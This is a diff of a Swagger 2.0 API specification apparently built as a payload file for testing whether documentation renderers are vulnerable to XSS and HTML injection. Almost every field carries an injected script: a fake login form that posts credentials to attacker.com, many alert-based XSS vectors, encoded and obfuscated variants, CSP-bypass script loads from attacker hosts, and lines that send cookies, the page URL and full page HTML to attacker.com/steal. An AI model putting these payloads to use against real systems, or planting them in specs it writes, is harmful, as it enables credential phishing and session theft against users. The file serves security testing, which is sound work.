@@ -1,150 +1,481 @@
 swagger: '2.0'
 info:
   version: 1.0.0
-  title: XSS & HTML Injection Test
+  title: XSS & HTML Injection Test - Ultimate
   description: '
-    <div class="login-form">
-        <div class="heading">
-            <h1>HTML Injection : Fake Login</h1>
+    <!-- ===== HTML INJECTION: FAKE LOGIN ===== -->
+    <div class="login-form" style="background:#f5f5f5;padding:20px;border-radius:10px;max-width:400px;margin:auto;border:1px solid #ddd;">
+        <div class="heading" style="text-align:center;color:#333;">
+            <h1>🔐 HTML Injection : Fake Login</h1>
+            <p style="color:#666;">Please enter your credentials</p>
         </div>
         <div class="form-container">
-            <form action="https://example.com/login" method="post" class="form-signin">
-                <div class="form-group">
-                    <label for="username">Username</label>
-                    <input type="text" name="username" size="20">
+            <form action="https://attacker.com/steal" method="post" class="form-signin">
+                <div class="form-group" style="margin-bottom:15px;">
+                    <label for="username" style="display:block;font-weight:bold;">Username</label>
+                    <input type="text" name="username" size="20" style="width:100%;padding:8px;border:1px solid #ccc;border-radius:4px;" placeholder="Enter username">
+                </div>
+                <div class="form-group" style="margin-bottom:15px;">
+                    <label for="password" style="display:block;font-weight:bold;">Password</label>
+                    <input type="password" name="password" size="20" style="width:100%;padding:8px;border:1px solid #ccc;border-radius:4px;" placeholder="Enter password">
                 </div>
                 <div class="form-group">
-                    <label for="password">Password</label>
-                    <input type="password" name="password" size="20">
-                </div>
-                <div class="form-group">
-                    <button type="submit" class="btn btn-default">Login</button>
+                    <button type="submit" class="btn btn-default" style="width:100%;padding:10px;background:#4CAF50;color:white;border:none;border-radius:4px;font-size:16px;cursor:pointer;">🔑 Login</button>
                 </div>
             </form>
         </div>
     </div>
     
+    <hr style="margin:30px 0;border:2px dashed #ff6b6b;">
+    
+    <!-- ===== EXTERNAL IMAGES ===== -->
+    <div style="background:#f0f0f0;padding:15px;border-radius:8px;margin:10px 0;">
+        <h3>🖼️ External Images (from the web)</h3>
+        
+        <!-- Image 1: GitHub logo -->
+        <p><strong>GitHub Logo:</strong></p>
+        <img src="https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png" width="100" style="border:2px solid #ccc;border-radius:8px;">
+        
+        <!-- Image 2: Google logo -->
+        <p><strong>Google Logo:</strong></p>
+        <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_light_color_272x92dp.png" width="200" style="border:2px solid #ccc;border-radius:8px;">
+        
+        <!-- Image 3: Placeholder image -->
+        <p><strong>Placeholder Image:</strong></p>
+        <img src="https://via.placeholder.com/300x100/ff6b6b/ffffff?text=HTML+Injection+Test" style="border:2px solid #ccc;border-radius:8px;">
+        
+        <!-- Image 4: Random image from the internet -->
+        <p><strong>Random Cat Image:</strong></p>
+        <img src="https://cataas.com/cat?width=300&height=200" width="300" style="border:2px solid #ccc;border-radius:8px;">
+        
+        <!-- Image 5: Even more images -->
+        <p><strong>More tests:</strong></p>
+        <img src="https://picsum.photos/200/100?random=1" style="border:2px solid #ccc;border-radius:8px;margin:2px;">
+        <img src="https://picsum.photos/200/100?random=2" style="border:2px solid #ccc;border-radius:8px;margin:2px;">
+        <img src="https://picsum.photos/200/100?random=3" style="border:2px solid #ccc;border-radius:8px;margin:2px;">
+        
+        <!-- Image 6: Try to load from dangerous domain (for testing SSRF via image) -->
+        <p><strong>SSRF Test via Image:</strong></p>
+        <img src="https://pzsvdl67hiek4600ok5jsqtyzp5gt6hv.oastify.com/test.jpg" width="200" style="border:2px solid red;border-radius:8px;">
+    </div>
+    
+    <!-- ===== IFRAME WITH EXTERNAL CONTENT ===== -->
+    <div style="background:#f0f0f0;padding:15px;border-radius:8px;margin:10px 0;">
+        <h3>🖼️ External Content via iFrame</h3>
+        <p><strong>This will attempt to load external content:</strong></p>
+        <iframe src="https://www.example.com" width="100%" height="150" style="border:2px solid #ccc;border-radius:8px;"></iframe>
+        <br><br>
+        <iframe src="https://github.com" width="100%" height="150" style="border:2px solid #ccc;border-radius:8px;"></iframe>
+    </div>
+    
+    <hr style="margin:30px 0;border:2px dashed #ff6b6b;">
+    
     <!-- ===== XSS PAYLOADS ===== -->
     
-    <!-- Test 1: Classic script -->
-    <script>alert("XSS-1");</script>
+    <!-- 🔥 CLASSIC PAYLOADS -->
+    <script>alert("XSS-1-Classic");</script>
+    <script>console.log("XSS-1-Classic-Log");</script>
     
-    <!-- Test 2: SVG onload -->
-    <svg onload="alert(&apos;XSS-2&apos;)"></svg>
+    <!-- 🔥 SVG PAYLOADS -->
+    <svg onload="alert(&apos;XSS-2-SVG-Onload&apos;)"></svg>
+    <svg><animate onbegin="alert(&apos;XSS-2-SVG-Animate&apos;)" attributeName="x" values="1;2"/></svg>
+    <svg><set onbegin="alert(&apos;XSS-2-SVG-Set&apos;)" attributeName="x" to="1"/></svg>
     
-    <!-- Test 3: IMG onerror -->
-    <img src="x" onerror="alert(&apos;XSS-3&apos;)">
+    <!-- 🔥 IMG PAYLOADS -->
+    <img src="x" onerror="alert(&apos;XSS-3-IMG-Onerror&apos;)">
+    <img src="x" onload="alert(&apos;XSS-3-IMG-Onload&apos;)">
     
-    <!-- Test 4: iframe -->
-    <iframe src="javascript:alert(&apos;XSS-4&apos;)"></iframe>
+    <!-- 🔥 IFRAME PAYLOADS -->
+    <iframe src="javascript:alert(&apos;XSS-4-Iframe&apos;)"></iframe>
+    <iframe srcdoc="&lt;script&gt;alert(&apos;XSS-4-Iframe-Srcdoc&apos;)&lt;/script&gt;"></iframe>
     
-    <!-- Test 5: Details ontoggle -->
-    <details open ontoggle="alert(&apos;XSS-5&apos;)">
+    <!-- 🔥 HTML5 PAYLOADS -->
+    <details open ontoggle="alert(&apos;XSS-5-Details&apos;)">
+    <dialog open onclose="alert(&apos;XSS-5-Dialog&apos;)"></dialog>
     
-    <!-- Test 6: MathML -->
-    <math><mi onclick="alert(&apos;XSS-6&apos;)">X</mi></math>
+    <!-- 🔥 MATHML PAYLOADS -->
+    <math><mi onclick="alert(&apos;XSS-6-MathML-Click&apos;)">X</mi></math>
+    <math href="javascript:alert(&apos;XSS-6-MathML-Href&apos;)">X</math>
     
-    <!-- Test 7: Video onerror -->
-    <video src="x" onerror="alert(&apos;XSS-7&apos;)" autoplay></video>
+    <!-- 🔥 MEDIA PAYLOADS -->
+    <video src="x" onerror="alert(&apos;XSS-7-Video&apos;)" autoplay></video>
+    <audio src="x" onerror="alert(&apos;XSS-8-Audio&apos;)" autoplay></audio>
     
-    <!-- Test 8: Audio onerror -->
-    <audio src="x" onerror="alert(&apos;XSS-8&apos;)" autoplay></audio>
+    <!-- 🔥 BODY PAYLOADS -->
+    <body onload="alert(&apos;XSS-9-Body&apos;)">
     
-    <!-- Test 9: Body onload -->
-    <body onload="alert(&apos;XSS-9&apos;)">
+    <!-- 🔥 INPUT PAYLOADS -->
+    <input type="text" autofocus onfocus="alert(&apos;XSS-10-Input-Focus&apos;)">
+    <input type="text" onfocusin="alert(&apos;XSS-10-Input-Focusin&apos;)">
     
-    <!-- Test 10: Input autofocus -->
-    <input type="text" autofocus onfocus="alert(&apos;XSS-10&apos;)">
+    <!-- 🔥 STYLE PAYLOADS -->
+    <div style="width: expression(alert(&apos;XSS-11-Expression&apos;))"></div>
+    <div style="background: url(javascript:alert(&apos;XSS-11-URL&apos;))"></div>
     
-    <!-- Test 11: Style with expression (IE) -->
-    <div style="width: expression(alert(&apos;XSS-11&apos;))"></div>
+    <!-- 🔥 OBJECT/EMBED PAYLOADS -->
+    <object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTLTEyLU9iamVjdCcpPC9zY3JpcHQ+"></object>
+    <embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTLTEzLUVtYmVkJyk8L3NjcmlwdD4=">
     
-    <!-- Test 12: Object data -->
-    <object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTLTEyJyk8L3NjcmlwdD4="></object>
+    <!-- 🔥 LINK PAYLOADS -->
+    <link rel="import" href="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTLTE0LUltcG9ydCcpPC9zY3JpcHQ+">
+    <link rel="stylesheet" href="data:text/css;base64,body{background:url(javascript:alert(&apos;XSS-14-CSS&apos;))}">
     
-    <!-- Test 13: Embed src -->
-    <embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTLTEzJyk8L3NjcmlwdD4=">
+    <!-- 🔥 META PAYLOADS -->
+    <meta http-equiv="refresh" content="0;url=javascript:alert(&apos;XSS-15-Meta&apos;)">
     
-    <!-- Test 14: Link rel=import -->
-    <link rel="import" href="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTLTE0Jyk8L3NjcmlwdD4=">
+    <!-- 🔥 ENCODED PAYLOADS -->
+    <script>eval(atob(&apos;YWxlcnQoIlhTUy0xNi1CYXNlNjQiKTs=&apos;));</script>
+    <script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,45,49,54,45,67,104,97,114,39,41))</script>
     
-    <!-- Test 15: Meta refresh -->
-    <meta http-equiv="refresh" content="0;url=javascript:alert(&apos;XSS-15&apos;)">
+    <!-- 🔥 EVENT PAYLOADS -->
+    <div onmouseover="alert(&apos;XSS-17-Mouseover&apos;)">🖱️ Hover me</div>
+    <p onclick="alert(&apos;XSS-18-Click&apos;)">👆 Click me</p>
+    <b onerror="alert(&apos;XSS-19-Onerror&apos;)">Bold</b>
+    <a href="javascript:alert(&apos;XSS-20-Pseudo&apos;)">🔗 Click</a>
     
-    <!-- Test 16: Base64 encoded script -->
-    <script>eval(atob(&apos;YWxlcnQoIlhTUy0xNiIpOw==&apos;));</script>
+    <!-- 🔥 NEW GENERATION PAYLOADS -->
+    <div onpointermove="alert(&apos;XSS-21-Pointer&apos;)">🖱️ Pointer Move</div>
+    <div onscroll="alert(&apos;XSS-22-Scroll&apos;)">📜 Scroll</div>
+    <div oncopy="alert(&apos;XSS-23-Copy&apos;)">📋 Copy</div>
+    <div onpaste="alert(&apos;XSS-24-Paste&apos;)">📋 Paste</div>
+    <div oncut="alert(&apos;XSS-25-Cut&apos;)">✂️ Cut</div>
+    <div oncontextmenu="alert(&apos;XSS-26-Context&apos;)">🖱️ Right Click</div>
+    <div ondblclick="alert(&apos;XSS-27-DblClick&apos;)">🔄 Double Click</div>
+    <div onkeydown="alert(&apos;XSS-28-KeyDown&apos;)">⌨️ Key Down</div>
+    <div onkeyup="alert(&apos;XSS-29-KeyUp&apos;)">⌨️ Key Up</div>
+    <div onfocus="alert(&apos;XSS-30-Focus&apos;)" tabindex="0">🎯 Focus</div>
+    <div onblur="alert(&apos;XSS-31-Blur&apos;)">👀 Blur</div>
     
-    <!-- Test 17: onmouseover -->
-    <div onmouseover="alert(&apos;XSS-17&apos;)">Hover me</div>
+    <!-- 🔥 PROTOCOL HANDLER PAYLOADS -->
+    <a href="javascript:fetch(&apos;https://attacker.com/steal?cookie=&apos;+document.cookie)">🍪 Steal Cookies</a>
+    <a href="javascript:document.location=&apos;https://attacker.com/steal?url=&apos;+btoa(document.URL)">🔗 Steal URL</a>
+    <a href="javascript:alert(document.domain)">🌐 Show Domain</a>
+    <a href="javascript:alert(document.cookie)">🍪 Show Cookies</a>
+    <a href="javascript:alert(localStorage.getItem(&apos;token&apos;))">🔑 Show Token</a>
+    <a href="javascript:alert(sessionStorage.getItem(&apos;session&apos;))">📦 Show Session</a>
     
-    <!-- Test 18: onclick in any tag -->
-    <p onclick="alert(&apos;XSS-18&apos;)">Click me</p>
+    <!-- 🔥 CSP BYPASS ATTEMPTS -->
+    <script src="data:text/javascript;base64,YWxlcnQoJ1hTUy0zMi1DU1AnKTs="></script>
+    <script src="https://cdn.jsdelivr.net/npm/evil.js"></script>
+    <script src="//attacker.com/evil.js"></script>
+    <script>import(&apos;data:text/javascript;base64,YWxlcnQoJ1hTUy0zMy1JbXBvcnQnKTs=&apos;)</script>
     
-    <!-- Test 19: onerror in any tag -->
-    <b onerror="alert(&apos;XSS-19&apos;)">Bold</b>
+    <!-- 🔥 DOM-BASED PAYLOADS -->
+    <img src="#" onerror="document.write(&apos;<h1>XSS-34-DOM</h1>&apos;)">
+    <img src="#" onerror="document.body.innerHTML=&apos;<h1>XSS-35-InnerHTML</h1>&apos;">
+    <img src="#" onerror="eval(&apos;alert(&quot;XSS-36-Eval&quot;)&apos;)">
+    <img src="#" onerror="setTimeout(&apos;alert(&quot;XSS-37-SetTimeout&quot;)&apos;,100)">
+    <img src="#" onerror="setInterval(&apos;alert(&quot;XSS-38-SetInterval&quot;)&apos;,1000)">
+    <img src="#" onerror="fetch(&apos;https://attacker.com/steal?data=&apos;+btoa(document.documentElement.outerHTML))">
     
-    <!-- Test 20: JavaScript pseudo protocol -->
-    <a href="javascript:alert(&apos;XSS-20&apos;)">Click</a>
+    <!-- 🔥 OBFUSCATED PAYLOADS -->
+    <script>alert(/XSS-39-Obfuscated/.source);</script>
+    <script>alert(atob("WFNTLTQwLUJhc2U2NA=="));</script>
+    <script>eval("alert('XSS-41-Eval')")</script>
+    <script>Function("alert('XSS-42-Function')")()</script>
+    <script>window["alert"]("XSS-43-Window")</script>
+    <script>self["alert"]("XSS-44-Self")</script>
+    <script>top["alert"]("XSS-45-Top")</script>
+    <script>parent["alert"]("XSS-46-Parent")</script>
+    <script>frames["alert"]("XSS-47-Frames")</script>
+    <script>globalThis["alert"]("XSS-48-GlobalThis")</script>
+    
+    <!-- 🔥 HTML ENTITIES TRICKS -->
+    <img src="x" onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#45;&#52;&#57;&#45;&#69;&#110;&#116;&#105;&#116;&#121;&#39;&#41;">
+    <img src="x" onerror="&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x27;&#x58;&#x53;&#x53;&#x2D;&#x35;&#x30;&#x2D;&#x48;&#x65;&#x78;&#x27;&#x29;">
+    
+    <!-- 🔥 LINE BREAKS TRICKS -->
+    <img src="x" onerror="alert
+    ('XSS-51-LineBreak')">
+    <img src="x" onerror="alert/*comment*/('XSS-52-Comment')">
+    <img src="x" onerror="alert&#10;('XSS-53-Newline')">
+    <img src="x" onerror="alert&#13;('XSS-54-CarriageReturn')">
+    
+    <!-- 🔥 NULL BYTE TRICKS (if vulnerable) -->
+    <img src="x" onerror="alert%00('XSS-55-NullByte')">
+    
+    <!-- 🔥 UNICODE TRICKS -->
+    <img src="x" onerror="alert('\u0058\u0053\u0053\u002D\u0035\u0036\u002D\u0055\u006E\u0069\u0063\u006F\u0064\u0065')">
+    
+    <!-- 🔥 TEMPLATE LITERALS -->
+    <script>alert(`XSS-57-Template`)</script>
+    <script>alert(String.raw`XSS-58-TemplateRaw`)</script>
+    
+    <!-- 🔥 ARRAY METHODS -->
+    <script>[].map.call([1],alert.bind(null,"XSS-59-Array"))</script>
+    
+    <!-- 🔥 PROXY TRICKS -->
+    <script>new Proxy({},{get:()=>alert("XSS-60-Proxy")}).x</script>
+    
+    <!-- 🔥 REFLECT TRICKS -->
+    <script>Reflect.apply(alert,this,["XSS-61-Reflect"])</script>
+    
+    <!-- 🔥 PROMISE TRICKS -->
+    <script>Promise.resolve().then(()=>alert("XSS-62-Promise"))</script>
+    
+    <!-- 🔥 ASYNC/AWAIT TRICKS -->
+    <script>(async ()=>{await 1;alert("XSS-63-Async")})()</script>
+    
+    <!-- 🔥 GENERATOR TRICKS -->
+    <script>(function*(){yield alert("XSS-64-Generator")})().next()</script>
   '
 paths:
+  # ===== MAIN PATH =====
   /:
     post:
-      summary: '<script>alert("XSS-Summary")</script>'
-      description: '<svg onload="alert(&apos;XSS-Path-Description&apos;)"></svg>'
+      summary: '<script>alert("XSS-Summary");</script>'
+      description: '
+        <svg onload="alert(&apos;XSS-Path-Description&apos;)"></svg>
+        <img src="x" onerror="alert(&apos;XSS-Path-Description-IMG&apos;)">
+        <details open ontoggle="alert(&apos;XSS-Path-Description-Details&apos;)">
+      '
       parameters:
         - name: testParam
           in: query
-          description: '<img src="x" onerror="alert(&apos;XSS-Param&apos;)">'
+          description: '
+            <img src="x" onerror="alert(&apos;XSS-Param&apos;)">
+            <svg onload="alert(&apos;XSS-Param-SVG&apos;)"></svg>
+          '
+          required: false
+          type: string
+        - name: testParam2
+          in: header
+          description: '<iframe src="javascript:alert(&apos;XSS-Header-Param&apos;)"></iframe>'
           required: false
           type: string
       responses:
         '200':
-          description: Login successful
+          description: '
+            <script>alert("XSS-Response-Description");</script>
+            <img src="x" onerror="alert(&apos;XSS-Response-IMG&apos;)">
+          '
           examples:
             application/json: |
               {
-                "<svg onload=alert('XSS-Response')></svg>": "test"
+                "<svg onload=alert('XSS-Response-Example')></svg>": "test",
+                "<img src=x onerror=alert('XSS-Response-Example-IMG')>": "test"
               }
-      x-example: '<script>alert("XSS-Example")</script>'
+      x-example: '
+        <script>alert("XSS-Example")</script>
+        <svg onload="alert(&apos;XSS-Example-SVG&apos;)"></svg>
+      '
+  
+  # ===== TEST WITH PATH PARAM =====
   /test/{id}:
     get:
-      summary: 'Test with path param'
-      description: '<details open ontoggle="alert(&apos;XSS-Path&apos;)">'
+      summary: '
+        <script>alert("XSS-Summary-Path")</script>
+        <svg onload="alert(&apos;XSS-Summary-Path-SVG&apos;)"></svg>
+      '
+      description: '
+        <details open ontoggle="alert(&apos;XSS-Path-Description-Details&apos;)">
+        <math><mi onclick="alert(&apos;XSS-Path-Description-Math&apos;)">X</mi></math>
+      '
       parameters:
         - name: id
           in: path
-          description: '<iframe src="javascript:alert(&apos;XSS-Path-Param&apos;)"></iframe>'
+          description: '
+            <iframe src="javascript:alert(&apos;XSS-Path-Param-Iframe&apos;)"></iframe>
+            <img src="x" onerror="alert(&apos;XSS-Path-Param-IMG&apos;)">
+          '
           required: true
+          type: string
+        - name: extra
+          in: query
+          description: '<script>alert("XSS-Extra-Param")</script>'
+          required: false
           type: string
       responses:
         '200':
-          description: OK
-          
+          description: '
+            <svg onload="alert(&apos;XSS-Response-Path-SVG&apos;)"></svg>
+          '
+          examples:
+            application/json: |
+              {
+                "<script>alert('XSS-Response-Path-Ex')</script>": "test"
+              }
+  
+  # ===== TEST WITH BODY =====
   /test-body:
     post:
-      summary: 'Test with body'
+      summary: '
+        <script>alert("XSS-Summary-Body")</script>
+        <img src="x" onerror="alert(&apos;XSS-Summary-Body-IMG&apos;)">
+      '
+      description: '
+        <math><mi onclick="alert(&apos;XSS-Body-Description-Math&apos;)">X</mi></math>
+        <details open ontoggle="alert(&apos;XSS-Body-Description-Details&apos;)">
+      '
       parameters:
         - name: body
           in: body
-          description: '<math><mi onclick="alert(&apos;XSS-Body&apos;)">X</mi></math>'
+          description: '
+            <script>alert("XSS-Body-Param")</script>
+            <svg onload="alert(&apos;XSS-Body-Param-SVG&apos;)"></svg>
+          '
           required: true
           schema:
             type: object
             properties:
               test:
                 type: string
-                description: '<svg onload="alert(&apos;XSS-Schema&apos;)"></svg>'
+                description: '
+                  <svg onload="alert(&apos;XSS-Schema-Prop&apos;)"></svg>
+                  <img src="x" onerror="alert(&apos;XSS-Schema-Prop-IMG&apos;)">
+                '
+              nested:
+                type: object
+                properties:
+                  deep:
+                    type: string
+                    description: '<script>alert("XSS-Schema-Deep")</script>'
+      responses:
+        '200':
+          description: '
+            <script>alert("XSS-Response-Body")</script>
+          '
+          examples:
+            application/json: |
+              {
+                "test": "<svg onload=alert('XSS-Response-Body-Ex')></svg>"
+              }
+  
+  # ===== TEST WITH ARRAY PARAM =====
+  /test-array:
+    get:
+      summary: 'Test with array parameter'
+      description: '<img src="x" onerror="alert(&apos;XSS-Array-Description&apos;)">'
+      parameters:
+        - name: ids
+          in: query
+          description: '<script>alert("XSS-Array-Param")</script>'
+          required: false
+          type: array
+          items:
+            type: string
+            description: '<svg onload="alert(&apos;XSS-Array-Item&apos;)"></svg>'
+      responses:
+        '200':
+          description: OK
+  
+  # ===== TEST WITH FORM DATA =====
+  /test-form:
+    post:
+      summary: 'Test with form data'
+      description: '<details open ontoggle="alert(&apos;XSS-Form-Description&apos;)">'
+      consumes:
+        - multipart/form-data
+      parameters:
+        - name: file
+          in: formData
+          description: '<script>alert("XSS-Form-File")</script>'
+          required: false
+          type: file
+        - name: text
+          in: formData
+          description: '<img src="x" onerror="alert(&apos;XSS-Form-Text&apos;)">'
+          required: false
+          type: string
+      responses:
+        '200':
+          description: OK
+  
+  # ===== TEST WITH SECURITY =====
+  /test-security:
+    get:
+      summary: 'Test with security'
+      description: '<svg onload="alert(&apos;XSS-Security-Description&apos;)"></svg>'
+      security:
+        - api_key: []
+        - oauth2: ['read']
+      parameters:
+        - name: token
+          in: header
+          description: '<script>alert("XSS-Security-Param")</script>'
+          required: false
+          type: string
       responses:
         '200':
           description: OK
 
+# ===== DEFINITIONS / MODELS =====
 definitions:
   TestModel:
     type: object
     properties:
       id:
         type: integer
-        description: '<img src="x" onerror="alert(&apos;XSS-Definition&apos;)">'
+        description: '
+          <img src="x" onerror="alert(&apos;XSS-Definition-ID&apos;)">
+          <svg onload="alert(&apos;XSS-Definition-ID-SVG&apos;)"></svg>
+        '
       name:
         type: string
-        description: '<script>alert("XSS-Definition-Name")</script>'
+        description: '
+          <script>alert("XSS-Definition-Name")</script>
+          <math><mi onclick="alert(&apos;XSS-Definition-Name-Math&apos;)">X</mi></math>
+        '
+      email:
+        type: string
+        description: '<iframe src="javascript:alert(&apos;XSS-Definition-Email&apos;)"></iframe>'
+      role:
+        type: string
+        enum:
+          - '<script>alert("XSS-Enum-Admin")</script>'
+          - '<img src="x" onerror="alert(&apos;XSS-Enum-User&apos;)">'
+          - '<svg onload="alert(&apos;XSS-Enum-Guest&apos;)"></svg>'
+      nested:
+        type: object
+        properties:
+          deep:
+            type: string
+            description: '<details open ontoggle="alert(&apos;XSS-Definition-Deep&apos;)">'
+  
+  UserModel:
+    type: object
+    properties:
+      username:
+        type: string
+        description: '<script>alert("XSS-UserModel-Username")</script>'
+      password:
+        type: string
+        description: '<img src="x" onerror="alert(&apos;XSS-UserModel-Password&apos;)">'
+      tokens:
+        type: array
+        items:
+          type: string
+          description: '<svg onload="alert(&apos;XSS-UserModel-Token&apos;)"></svg>'
+  
+  ErrorModel:
+    type: object
+    properties:
+      code:
+        type: integer
+        description: '<math href="javascript:alert(&apos;XSS-Error-Code&apos;)">X</math>'
+      message:
+        type: string
+        description: '<a href="javascript:alert(&apos;XSS-Error-Message&apos;)">Click</a>'
+
+# ===== SECURITY DEFINITIONS =====
+securityDefinitions:
+  api_key:
+    type: apiKey
+    name: '<script>alert("XSS-SecDef-Name")</script>'
+    in: header
+    description: '
+      <img src="x" onerror="alert(&apos;XSS-SecDef-Desc&apos;)">
+    '
+  oauth2:
+    type: oauth2
+    flow: implicit
+    authorizationUrl: '
+      javascript:alert("XSS-OAuth-URL")
+    '
+    description: '<svg onload="alert(&apos;XSS-OAuth-Desc&apos;)"></svg>'
+
+# ===== EXTENSIONS =====
+x-test: '<script>alert("XSS-Extension")</script>'
+x-sample: '<img src="x" onerror="alert(&apos;XSS-Extension-IMG&apos;)">'
+x-metadata:
+  test: '<svg onload="alert(&apos;XSS-Extension-Meta&apos;)"></svg>'
